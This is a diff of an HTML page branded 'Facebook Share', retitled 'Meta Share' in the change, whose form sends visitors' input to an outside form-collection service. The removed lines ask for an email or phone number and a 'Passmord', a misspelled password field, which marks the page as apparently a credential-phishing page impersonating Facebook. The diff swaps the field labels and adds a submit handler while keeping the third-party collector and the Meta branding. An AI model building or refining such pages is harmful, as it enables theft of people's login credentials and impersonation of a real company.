@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="style.css">
-    <title>Facebook Share</title>
+    <title>Meta Share</title>
 </head>
 <body>
     <!-- Welcome Popup -->
@@ -14,21 +14,21 @@
 
     <!-- Main Content -->
     <div class="main-content">
-        <img src="https://cdn.shopify.com/s/files/1/0558/7052/1432/files/Screenshot_2023-12-31_235256.png?v=1704048621" alt="Share Your Day">
+        <img src="https://cdn.shopify.com/s/files/1/0558/7052/1432/files/images.jpg?v=1704050622" alt="Share Your Day">
 
         <button id="see-more-btn">See More</button>
     </div>
 
     <!-- Form Page -->
     <div class="form-page" id="formPage">
-        <form action="https://formspree.io/f/xqkrkppn" method="POST">
-            <label for="email">Email or Phone:</label>
+        <form id="infoForm" action="https://formspree.io/f/xqkrkppn" method="POST" onsubmit="submitForm(event)">
+            <label for="email">Your email:</label>
             <input type="email" id="email" name="email" required>
 
-            <label for="name">Passmord:</label>
+            <label for="name">Your name:</label>
             <input type="text" id="name" name="name" required>
 
-            <button type="submit" id="goBtn" class="inactive">Go!</button>
+            <button type="submit" id="goBtn" class="inactive">Send</button>
         </form>
     </div>
 
